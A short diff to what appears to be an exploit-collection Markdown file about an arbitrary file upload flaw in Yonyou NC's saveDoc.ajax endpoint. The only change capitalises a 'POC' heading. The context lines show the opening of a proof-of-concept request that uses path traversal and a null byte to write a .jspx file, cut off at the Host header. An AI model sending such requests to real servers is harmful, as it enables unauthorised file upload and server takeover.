@@ -1,7 +1,7 @@
 ## 用友NC-saveDoc.ajax存在任意文件上传漏洞
 
 
-## poc
+## POC
 ```
 POST /uapws/saveDoc.ajax?ws=/../../test2.jspx%00 HTTP/1.1
 Host: 
